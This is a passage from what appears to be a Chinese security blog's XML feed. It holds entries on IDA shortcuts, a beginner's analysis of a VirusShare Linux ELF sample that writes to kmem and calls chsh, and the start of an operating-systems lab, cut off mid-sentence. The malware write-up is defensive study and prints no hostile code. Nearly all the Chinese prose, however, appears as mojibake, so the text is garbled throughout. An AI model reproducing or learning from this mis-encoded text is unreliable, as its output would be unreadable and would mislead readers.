    
    
    <categories>
      
      <category>ç½‘ç»œç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>ç½‘ç»œé€šä¿¡</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDAå¸¸ç”¨å¿«æ·é”®</title>
    <link href="/posts/c365298/"/>
    <url>/posts/c365298/</url>
    
    <content type="html"><![CDATA[<h1 id="å¸¸ç”¨å¿«æ·é”®"><a class="markdownIt-Anchor" href="#å¸¸ç”¨å¿«æ·é”®"></a> å¸¸ç”¨å¿«æ·é”®</h1><p>IDAä¸­çš„å¿«æ·é”®éƒ½æ˜¯å’Œèœå•æ çš„å„ä¸ªåŠŸèƒ½é€‰é¡¹ä¸€ä¸€å¯¹åº”çš„ï¼ŒåŸºæœ¬ä¸Šä½ åªè¦èƒ½åœ¨èœå•æ ä¸Šæ‰¾åˆ°æŸä¸ªåŠŸèƒ½ï¼Œä¹Ÿå°±èƒ½çœ‹åˆ°ç›¸åº”çš„å¿«æ·é”®ï¼Œè¿™é‡Œè®°å½•å‡ ä¸ªå¸¸ç”¨çš„ï¼š</p><p>aï¼šå°†æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><p>f5ï¼šä¸€é”®åæ±‡ç¼–</p><p>escï¼šå›é€€é”®ï¼Œèƒ½å¤Ÿå€’å›ä¸Šä¸€éƒ¨æ“ä½œçš„è§†å›¾ï¼ˆåªæœ‰åœ¨åæ±‡ç¼–çª—å£æ‰æ˜¯è¿™ä¸ªä½œç”¨ï¼Œå¦‚æœæ˜¯åœ¨å…¶ä»–çª—å£æŒ‰ä¸‹escï¼Œä¼šå…³é—­è¯¥çª—å£ï¼‰</p><p>shift+f12ï¼šå¯ä»¥æ‰“å¼€stringçª—å£ï¼Œä¸€é”®æ‰¾å‡ºæ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œå³å‡»setupï¼Œè¿˜èƒ½å¯¹çª—å£çš„å±æ€§è¿›è¡Œè®¾ç½®</p><p>ctrl+wï¼šä¿å­˜idaæ•°æ®åº“</p><p>ctrl+sï¼šé€‰æ‹©æŸä¸ªæ•°æ®æ®µï¼Œç›´æ¥è¿›è¡Œè·³è½¬</p><p>ctrl+é¼ æ ‡æ»šè½®ï¼šèƒ½å¤Ÿè°ƒèŠ‚æµç¨‹è§†å›¾çš„å¤§å°</p><p>xï¼šå¯¹ç€æŸä¸ªå‡½æ•°ã€å˜é‡æŒ‰è¯¥å¿«æ·é”®ï¼Œå¯ä»¥æŸ¥çœ‹å®ƒçš„äº¤å‰å¼•ç”¨</p><p>gï¼šç›´æ¥è·³è½¬åˆ°æŸä¸ªåœ°å€</p><p>nï¼šæ›´æ”¹å˜é‡çš„åç§°</p><p>yï¼šæ›´æ”¹å˜é‡çš„ç±»å‹</p><p>/ ï¼šåœ¨åç¼–è¯‘åä¼ªä»£ç çš„ç•Œé¢ä¸­å†™ä¸‹æ³¨é‡Š</p><p>\ï¼šåœ¨åç¼–è¯‘åä¼ªä»£ç çš„ç•Œé¢ä¸­éšè—/æ˜¾ç¤ºå˜é‡å’Œå‡½æ•°çš„ç±»å‹æè¿°ï¼Œæœ‰æ—¶å€™å˜é‡ç‰¹åˆ«å¤šçš„æ—¶å€™éšè—æ‰ç±»å‹æè¿°çœ‹èµ·æ¥ä¼šè½»æ¾å¾ˆå¤š</p><p>ï¼›ï¼šåœ¨åæ±‡ç¼–åçš„ç•Œé¢ä¸­å†™ä¸‹æ³¨é‡Š</p><p>ctrl+shift+wï¼šæ‹æ‘„IDAå¿«ç…§</p><p>uï¼šundefineï¼Œå–æ¶ˆå®šä¹‰å‡½æ•°ã€ä»£ç ã€æ•°æ®çš„å®šä¹‰</p><p>Hï¼šåœ¨æ•°å­—ä¸ŠæŒ‰ä¸‹Hé”®æˆ–è€…å³é”®è¿›è¡Œé€‰æ‹©ï¼Œå¯ä»¥å°†æ•°å­—è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼š</p><p>Bï¼šæŒ‰ä¸‹<strong>Bé”®</strong>è½¬æ¢ä¸ºäºŒè¿›åˆ¶ä¹Ÿæ˜¯åŒç†ã€‚</p><p>c: å°†æ•°æ®æ®µè½¬åŒ–æˆä»£ç </p><p><strong>å‚è€ƒé“¾æ¥</strong></p><p><a href="https://xz.aliyun.com/t/4205#toc-0">https://xz.aliyun.com/t/4205#toc-0</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>IDA</tag>
      
      <tag>é€†å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¶æ„æ ·æœ¬åˆ†æåˆæ¢</title>
    <link href="/posts/68bccacd/"/>
    <url>/posts/68bccacd/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ·æœ¬ä¿¡æ¯"><a class="markdownIt-Anchor" href="#æ ·æœ¬ä¿¡æ¯"></a> æ ·æœ¬ä¿¡æ¯</h1><p>æ–‡ä»¶åç§°ï¼šVirusShare_0ba82bfa31bbc0d46cc1f0d2395d1d7f</p><p>æ–‡ä»¶MD5ï¼š0ba82bfa31bbc0d46cc1f0d2395d1d7f</p><p>æ–‡ä»¶ç±»å‹ï¼šlinux  elf32</p><p><img src="/posts/68bccacd/image-20211225200333850.png" alt="image-20211225200333850"></p><h1 id="æ ·æœ¬è¡Œä¸ºåˆ†æ"><a class="markdownIt-Anchor" href="#æ ·æœ¬è¡Œä¸ºåˆ†æ"></a> æ ·æœ¬è¡Œä¸ºåˆ†æ</h1><h3 id="åŠ¨æ€åˆ†æ"><a class="markdownIt-Anchor" href="#åŠ¨æ€åˆ†æ"></a> åŠ¨æ€åˆ†æ</h3><p>åœ¨linuxè™šæ‹Ÿæœºä¸Šæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶åï¼Œå¯ä»¥å‘ç°å…¶åˆ›å»ºäº†ä¸¤ä¸ªç©ºæ–‡ä»¶ï¼Œé‡Œé¢å¹¶æ²¡æœ‰å†…å®¹</p><p><img src="/posts/68bccacd/image-20211226124104417.png" alt="image-20211226124104417"></p><p>ç»ˆç«¯ä¿¡æ¯ï¼š</p><p><img src="/posts/68bccacd/image-20211226124157481.png" alt="image-20211226124157481"></p><p>å…¶æ‰§è¡Œäº†chshï¼Œåº”è¯¥æ˜¯å¸Œæœ›æ”¹å˜ç”¨æˆ·çš„ç™»é™†shell,ä½†å› ä¸ºæ²¡æœ‰å¯†ç ï¼Œå¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼ŒåŒæ—¶å¯ä»¥ä»ä¸Šé¢çš„æç¤ºä¿¡æ¯çœ‹å‡ºï¼Œæ–‡ä»¶åº”è¯¥ä¹Ÿæ‰§è¡Œäº†ä¸€ä¸ªsendfile()æ“ä½œï¼Œä½†ä¼¼ä¹å› ä¸ºæ— æ•ˆå‚æ•°å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸã€‚</p><h3 id="é™æ€åˆ†æ"><a class="markdownIt-Anchor" href="#é™æ€åˆ†æ"></a> é™æ€åˆ†æ</h3><p>åœ¨idaé‡Œæ‰“å¼€ï¼ŒF5åçœ‹åˆ°å…¶mainå‡½æ•°å¦‚å›¾</p><p><img src="/posts/68bccacd/image-20211226132223007.png" alt="image-20211226132223007"></p><p>dolistenå‡½æ•°å†…å®¹</p><p><img src="/posts/68bccacd/image-20211226132833929.png" alt="image-20211226132833929"></p><h3 id="æ ·æœ¬åŸºæœ¬è¡Œä¸º"><a class="markdownIt-Anchor" href="#æ ·æœ¬åŸºæœ¬è¡Œä¸º"></a> æ ·æœ¬åŸºæœ¬è¡Œä¸º</h3><ol><li>æ ·æœ¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶sendfile1,å¾€å…¶ä¸­å†™å…¥å¤§é‡å­—ç¬¦Aï¼Œä¹‹åè¿›ç¨‹åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹1ï¼Œç»‘å®šæœ¬æœºip,å¼€å§‹ç›‘å¬ï¼Œç­‰å¾…çˆ¶è¿›ç¨‹å‘é€ä¿¡æ¯ã€‚</li><li>ä¹‹åçˆ¶è¿›ç¨‹åœ¨å†åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹2ï¼Œçˆ¶è¿›ç¨‹é€šè¿‡sendfile()å°†sendfile1()çš„å†…å®¹å‘é€ç»™å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹æ”¶åˆ°åå°†å†…å®¹å†™å…¥kmemä¸­ã€‚</li><li>å­è¿›ç¨‹2æ¸…ç©ºsendfile1æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä¸”æ‰§è¡Œåæ¬¡chshçš„æ“ä½œï¼Œæ„å›¾å°†å½“å‰ç™»å½•shellæ”¹ä¸º/bin/sh</li></ol><h3 id="gdb"><a class="markdownIt-Anchor" href="#gdb"></a> gdb</h3><p>å› ä¸ºæ— æ³•é€šè¿‡æ‰§è¡Œçœ‹åˆ°æ–‡ä»¶ä¸­é—´å†…å®¹ï¼Œè™½ç„¶æ ¹æ®é™æ€åˆ†ææ˜¯å°†sendfile1çš„å†…å®¹å†™å…¥kmemï¼Œä½†ä¼¼ä¹å‘é€å¹¶æ²¡æœ‰æˆåŠŸï¼Œgdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œåœ¨dolistenå‡ºä¸‹æ–­ç‚¹ï¼Œç„¶åsæ­¥å…¥ï¼Œæ‰§è¡Œåˆ°å†™å…¥kmemæ—¶å°†æ–‡ä»¶å†…å®¹æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°å…¶é€šä¿¡å°±æ˜¯åŸºäºæœ¬æœºç«¯å£ï¼Œä½†å…·ä½“å†…å®¹å¹¶æ²¡æœ‰åŠæ³•æˆåŠŸæ˜¾ç¤ºã€‚æ€€ç–‘æ˜¯sendfile()å‡½æ•°æœ¬èº«å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸã€‚</p><p><img src="/posts/68bccacd/image-20211226110537703.png" alt="image-20211226110537703"></p><p>è€Œé€šè¿‡gdbæ‰“å°sendfile1çš„å†…å®¹åˆ™å’Œé¢„æœŸä¸€æ ·å…¨æ˜¯Aã€‚</p><h1 id="é—®é¢˜"><a class="markdownIt-Anchor" href="#é—®é¢˜"></a> é—®é¢˜</h1><p>è¯¥æ ·æœ¬åœ¨æ‰§è¡Œsendfile()å‡½æ•°æ—¶ï¼Œsendfileå‡½æ•°çš„å‚æ•°ç»™å®šä¼¼ä¹æœ‰ä¸€å®šé—®é¢˜ã€‚</p><p>è¿™ä¸ªå‡½æ•°åŸå‹ä¸ºssize_t sendfile(int out_fd , int in_fd , off_t * offset , size_t count );</p><p>å…¶ä¸­in_fdåº”è¯¥æ˜¯ä¸ºè¯»å–è€Œæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œout_fdåº”è¯¥æ˜¯ä¸€ä¸ªä¸ºå†™å…¥è€Œæ‰“å¼€çš„æè¿°ç¬¦ã€‚</p><p>åœ¨ç¨‹åºä¸­ï¼Œfdæ˜¯socketçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œout_fdæ˜¯æ–‡ä»¶sendfile1ï¼ŒæŒ‰ç…§ç¨‹åºä¸­çš„å‚æ•°ç»™å®šï¼Œå…¶æ„å›¾æ˜¯å°†socketçš„å†…å®¹å†™å…¥sendfile1ä¸­ï¼Œä½†æ ¹æ®ç¨‹åºè®¾è®¡æŒ‰ç†åº”è¯¥æ˜¯å°†sendfile1å‘é€åˆ°socketï¼Œè®©å­è¿›ç¨‹æ¥æ”¶ã€‚</p><p>è¿™ä¸ªå‚æ•°çš„ä½ç½®çš„é¢ å€’ä¹Ÿå’Œå‰é¢åŠ¨æ€åˆ†æä¸­ç›´æ¥æ‰§è¡Œç¨‹åºæ˜¾ç¤ºsendfile()çš„å‚æ•°æ— æ•ˆç›¸å¯¹åº”ï¼Œè€Œè¿™ä¹Ÿå¯èƒ½æ˜¯gdbè°ƒè¯•ä¸­æ— æ³•æ­£ç¡®æ‰“å°å‡ºkmemçš„åŸå› ã€‚</p><p><img src="/posts/68bccacd/image-20211226135708611.png" alt="image-20211226135708611"></p><p><img src="/posts/68bccacd/image-20211226134405112.png" alt="image-20211226134405112"></p><h1 id="å¯ç–‘è¡Œä¸ºæ€»ç»“"><a class="markdownIt-Anchor" href="#å¯ç–‘è¡Œä¸ºæ€»ç»“"></a> å¯ç–‘è¡Œä¸ºæ€»ç»“</h1><p>è¯¥æ ·æœ¬çš„è¡Œä¸ºè¾ƒä¸ºç®€å•ï¼Œå…¶æœ¬èº«ä¼¼ä¹æ²¡æœ‰å®ç°æ¶æ„è¡Œä¸ºï¼Œæ€»ä½“æ¥è¯´</p><ul><li>åªæ˜¯è¿›è¡Œäº†ä¸€ä¸ªçˆ¶å­è¿›ç¨‹é—´çš„é€šä¿¡å’Œæ–‡æœ¬å†…å®¹ä¼ è¾“ï¼Œå¹¶ä¸”æœ€åç”¨æˆ·å¹¶ä¸èƒ½çœ‹åˆ°æ–‡æœ¬ä¼ è¾“çš„å†…å®¹ã€‚</li><li>æœ€åå°è¯•åˆ‡æ¢ç™»é™†shell</li></ul><p>ä½†æ˜¯è¯¥æ ·æœ¬å¯ä»¥ä½œä¸ºä¸€ä¸ªå¤§çš„æ¶æ„æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ç»„æˆï¼Œç»“åˆåˆ«çš„å‡½æ•°æ¥å®ç°æ›´ç¡®åˆ‡çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚æ–‡æœ¬çš„éšè”½é€šä¿¡ä¼ è¾“ã€‚ç»“åˆçªƒå–åˆ°å¯†ç æ¥æˆåŠŸåˆ‡æ¢shellã€‚</p><h1 id="é™„å½•-éƒ¨åˆ†è°ƒç”¨å‡½æ•°åŠŸèƒ½è¯´æ˜"><a class="markdownIt-Anchor" href="#é™„å½•-éƒ¨åˆ†è°ƒç”¨å‡½æ•°åŠŸèƒ½è¯´æ˜"></a> é™„å½•-éƒ¨åˆ†è°ƒç”¨å‡½æ•°åŠŸèƒ½è¯´æ˜</h1><blockquote><h2 id="fwrite"><a class="markdownIt-Anchor" href="#fwrite"></a> fwrite()</h2><h4 id="å£°æ˜"><a class="markdownIt-Anchor" href="#å£°æ˜"></a> å£°æ˜</h4><p>ä¸‹é¢æ˜¯ fwrite() å‡½æ•°çš„å£°æ˜ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">fwrite</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">size_t</span> nmemb, FILE *stream)</span></span><br></code></pre></div></td></tr></table></figure><h4 id="å‚æ•°"><a class="markdownIt-Anchor" href="#å‚æ•°"></a> å‚æ•°</h4><ul><li><strong>ptr</strong> â€“ è¿™æ˜¯æŒ‡å‘è¦è¢«å†™å…¥çš„å…ƒç´ æ•°ç»„çš„æŒ‡é’ˆã€‚</li><li><strong>size</strong> â€“ è¿™æ˜¯è¦è¢«å†™å…¥çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</li><li><strong>nmemb</strong> â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚ã€‚</li><li><strong>stream</strong> â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å‡ºæµã€‚</li></ul><h4 id="è¿”å›å€¼"><a class="markdownIt-Anchor" href="#è¿”å›å€¼"></a> è¿”å›å€¼</h4><p>å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ª size_t å¯¹è±¡ï¼Œè¡¨ç¤ºå…ƒç´ çš„æ€»æ•°ï¼Œè¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªæ•´å‹æ•°æ®ç±»å‹ã€‚å¦‚æœè¯¥æ•°å­—ä¸ nmemb å‚æ•°ä¸åŒï¼Œåˆ™ä¼šæ˜¾ç¤ºä¸€ä¸ªé”™è¯¯ã€‚</p><h2 id="fopen"><a class="markdownIt-Anchor" href="#fopen"></a> fopen()</h2><h4 id="å£°æ˜-2"><a class="markdownIt-Anchor" href="#å£°æ˜-2"></a> å£°æ˜</h4><p>ä¸‹é¢æ˜¯ fopen() å‡½æ•°çš„å£°æ˜ã€‚</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">FILE</span> *fopen(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)<br></code></pre></div></td></tr></table></figure><h4 id="å‚æ•°-2"><a class="markdownIt-Anchor" href="#å‚æ•°-2"></a> å‚æ•°</h4><ul><li><strong>filename</strong> â€“ è¿™æ˜¯ C å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†è¦æ‰“å¼€çš„æ–‡ä»¶åç§°ã€‚</li><li><strong>mode</strong> â€“ è¿™æ˜¯ C å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†æ–‡ä»¶è®¿é—®æ¨¡å¼ï¼Œæ¨¡å¼å¦‚ä¸‹ï¼š</li></ul><table><thead><tr><th style="text-align:left">æ¨¡å¼</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">â€œrâ€</td><td style="text-align:left">æ‰“å¼€ä¸€ä¸ªç”¨äºè¯»å–çš„æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å¿…é¡»å­˜åœ¨ã€‚</td></tr><tr><td style="text-align:left">â€œwâ€</td><td style="text-align:left">åˆ›å»ºä¸€ä¸ªç”¨äºå†™å…¥çš„ç©ºæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶åç§°ä¸å·²å­˜åœ¨çš„æ–‡ä»¶ç›¸åŒï¼Œåˆ™ä¼šåˆ é™¤å·²æœ‰æ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶è¢«è§†ä¸ºä¸€ä¸ªæ–°çš„ç©ºæ–‡ä»¶ã€‚</td></tr><tr><td style="text-align:left">â€œaâ€</td><td style="text-align:left">è¿½åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚å†™æ“ä½œå‘æ–‡ä»¶æœ«å°¾è¿½åŠ æ•°æ®ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ã€‚</td></tr><tr><td style="text-align:left">â€œr+â€</td><td style="text-align:left">æ‰“å¼€ä¸€ä¸ªç”¨äºæ›´æ–°çš„æ–‡ä»¶ï¼Œå¯è¯»å–ä¹Ÿå¯å†™å…¥ã€‚è¯¥æ–‡ä»¶å¿…é¡»å­˜åœ¨ã€‚</td></tr><tr><td style="text-align:left">â€œw+â€</td><td style="text-align:left">åˆ›å»ºä¸€ä¸ªç”¨äºè¯»å†™çš„ç©ºæ–‡ä»¶ã€‚</td></tr><tr><td style="text-align:left">â€œa+â€</td><td style="text-align:left">æ‰“å¼€ä¸€ä¸ªç”¨äºè¯»å–å’Œè¿½åŠ çš„æ–‡ä»¶ã€‚</td></tr></tbody></table><h2 id="fsfat"><a class="markdownIt-Anchor" href="#fsfat"></a> fsfat</h2><h5 id="å®šä¹‰å‡½æ•°"><a class="markdownIt-Anchor" href="#å®šä¹‰å‡½æ•°"></a> å®šä¹‰å‡½æ•°</h5><p>int fstat(int fildes, struct stat *buf);</p><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜ï¼š</h4><p>fstat()ç”¨æ¥å°†å‚æ•°fildes æ‰€æŒ‡çš„æ–‡ä»¶çŠ¶æ€, å¤åˆ¶åˆ°å‚æ•°buf æ‰€æŒ‡çš„ç»“æ„ä¸­(struct stat). Fstat()ä¸stat()ä½œç”¨å®Œå…¨ç›¸åŒ, ä¸åŒå¤„åœ¨äºä¼ å…¥çš„å‚æ•°ä¸ºå·²æ‰“å¼€çš„æ–‡ä»¶æè¿°è¯. è¯¦ç»†å†…å®¹è¯·å‚è€ƒstat().</p><h4 id="è¿”å›å€¼-2"><a class="markdownIt-Anchor" href="#è¿”å›å€¼-2"></a> è¿”å›å€¼ï¼š</h4><p>æ‰§è¡ŒæˆåŠŸåˆ™è¿”å›0, å¤±è´¥è¿”å›-1, é”™è¯¯ä»£ç å­˜äºerrno.</p><h2 id="socket"><a class="markdownIt-Anchor" href="#socket"></a> socket()</h2><h4 id="åŸå‹"><a class="markdownIt-Anchor" href="#åŸå‹"></a> åŸå‹</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">socket</span><span class="hljs-params">(<span class="hljs-keyword">int</span> domain, <span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> protocol)</span></span>;<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å»ºç«‹ä¸€ä¸ªåè®®æ—ä¸ºdomainã€åè®®ç±»å‹ä¸ºtypeã€åè®®ç¼–å·ä¸ºprotocolçš„å¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœå‡½æ•°è°ƒç”¨æˆåŠŸï¼Œä¼šè¿”å›ä¸€ä¸ªæ ‡è¯†è¿™ä¸ªå¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥çš„æ—¶å€™è¿”å›-1ã€‚</p><p>domain:AF_INET=2,IPv4 Internetåè®®</p><p>type:SOCK_STREAM=1,Tcpè¿æ¥ï¼Œæä¾›åºåˆ—åŒ–çš„ã€å¯é çš„ã€åŒå‘è¿æ¥çš„å­—èŠ‚æµã€‚æ”¯æŒå¸¦å¤–æ•°æ®ä¼ è¾“</p><p>protocol:ipv4åªæœ‰ä¸€ä¸ªåè®®åˆ™ä¸º0</p><h2 id="sendfile"><a class="markdownIt-Anchor" href="#sendfile"></a> sendfile()</h2><h4 id="å£°æ˜-3"><a class="markdownIt-Anchor" href="#å£°æ˜-3"></a> å£°æ˜</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">sendfile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> out_fd , <span class="hljs-keyword">int</span> in_fd , <span class="hljs-keyword">off_t</span> * offset , <span class="hljs-keyword">size_t</span> count )</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="æè¿°"><a class="markdownIt-Anchor" href="#æè¿°"></a> æè¿°</h4><p>sendfile () åœ¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å’Œå¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´å¤åˆ¶æ•°æ®ã€‚</p><p>å› ä¸ºè¿™ä¸ªå¤åˆ¶æ˜¯åœ¨å†…æ ¸å†…éƒ¨å®Œæˆçš„ï¼Œæ‰€ä»¥sendfile () æ˜¯æ¯”read(2)å’Œwrite(2)çš„ç»„åˆæ›´æœ‰æ•ˆï¼Œ<br>è¿™ä¸éœ€è¦å°†æ•°æ®ä¼ å…¥å’Œä¼ å‡ºç”¨æˆ·ç©ºé—´ã€‚</p><p>in_fdåº”è¯¥æ˜¯ä¸ºè¯»å–è€Œæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œout_fdåº”è¯¥æ˜¯ä¸€ä¸ªä¸ºå†™å…¥è€Œæ‰“å¼€çš„æè¿°ç¬¦ã€‚</p><p>å¦‚æœoffsetä¸ä¸º NULLï¼Œåˆ™å®ƒæŒ‡å‘ä¸€ä¸ªå˜é‡sendfile () å°†ä»in_fdå¼€å§‹è¯»å–æ•°æ®çš„æ–‡ä»¶åç§»é‡ã€‚å½“sendfile ()è¿”å›æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«è®¾ç½®ä¸ºè¯»å–çš„æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹åçš„å­—èŠ‚çš„åç§»é‡ã€‚å¦‚æœ<br>offsetä¸ä¸ºNULLï¼Œåˆ™sendfile ()ä¸ä¿®æ”¹æ–‡ä»¶in_fd çš„åç§»é‡ï¼›å¦åˆ™è°ƒæ•´æ–‡ä»¶åç§»ä»¥åæ˜ ä»in_fdè¯»å–çš„å­—èŠ‚æ•°ã€‚</p><p>å¦‚æœoffsetä¸º NULLï¼Œåˆ™å°†ä»in_fdå¼€å§‹è¯»å–æ•°æ®æ–‡ä»¶åç§»é‡ï¼Œæ–‡ä»¶åç§»é‡å°†è¢«è°ƒç”¨æ›´æ–°ã€‚</p><p>countæ˜¯è¦åœ¨æ–‡ä»¶ä¹‹é—´å¤åˆ¶çš„å­—èŠ‚æ•°æè¿°ç¬¦</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>æ¶æ„æ ·æœ¬åˆ†æ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
      <tag>é€†å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒå…«-æ–‡ä»¶ç»“æ„</title>
    <link href="/posts/6255939a/"/>
    <url>/posts/6255939a/</url>
    
    <content type="html"><![CDATA[<h1 id="æ“ä½œç³»ç»Ÿç¬¬å…«æ¬¡å®éªŒ"><a class="markdownIt-Anchor" href="#æ“ä½œç³»ç»Ÿç¬¬å…«æ¬¡å®éªŒ"></a> æ“ä½œç³»ç»Ÿç¬¬å…«æ¬¡å®éªŒ</h1><h1 id="æ–‡ä»¶ç»“æ„"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ç»“æ„"></a> æ–‡ä»¶ç»“æ„</h1><h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ol><li>æŠŠæ–‡ä»¶çš„é€»è¾‘ç»“æ„è½¬æ¢æˆå­˜å‚¨ç»“æ„</li><li>è®¾è®¡ä¾¿äºé¡ºåºå­˜å–å’Œç›´æ¥å­˜å–çš„æ–‡ä»¶å­˜å‚¨ç»“æ„ã€‚</li></ol><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>ç ”ç©¶ç”¨æˆ·æ¦‚å¿µä¸­çš„ä¿¡æ¯ç»„ç»‡æ–¹å¼</li><li>ç†è§£æ–‡ä»¶çš„é€»è¾‘ç»“æ„ã€å­˜å–ç»“æ„ã€å­˜å–æ–¹å¼ä¹‹é—´çš„è”ç³»</li><li>æ¨¡æ‹Ÿè®¾è®¡æ–‡ä»¶çš„å­˜å‚¨ç»“æ„</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><h3 id="ç¬¬ä¸€é¢˜"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€é¢˜"></a> ç¬¬ä¸€é¢˜ï¼š</h3><p><strong>æ¨¡æ‹Ÿè®¾è®¡MS-DOSæ“ä½œç³»ç»Ÿä¸­ç£ç›˜æ–‡ä»¶çš„å­˜å‚¨ç»“æ„ã€‚</strong></p><ol><li><p>å½“ç”¨æˆ·å¯¹è®°å½•å¼æ–‡ä»¶é‡‡ç”¨é¡ºåºå­˜ä»¥æ–¹å¼æ—¶ï¼Œç”¨æˆ·æ€»æ˜¯ä¾æ¬¡åœ°è®¿é—®ä¸€ä¸ªä¸ªé€»è¾‘è®°å½•ï¼Œå³å½“è®¿é—®äº†ç¬¬iä¸ªè®°å½•åï¼Œä¸‹æ¬¡æ€»æ˜¯è®¿é—®ç¬¬i+1ä¸ªè®°å½•ã€‚æ‰€ä»¥ï¼Œå½“ç”¨æˆ·é‡‡ç”¨é¡ºåºå­˜å–æ–¹å¼è®¿é—®æ–‡ä»¶æ—¶ï¼Œåªè¦ç»™å‡ºè®¿é—®è¦æ±‚ï¼ˆè¯»æˆ–å†™ï¼‰è€Œæ— 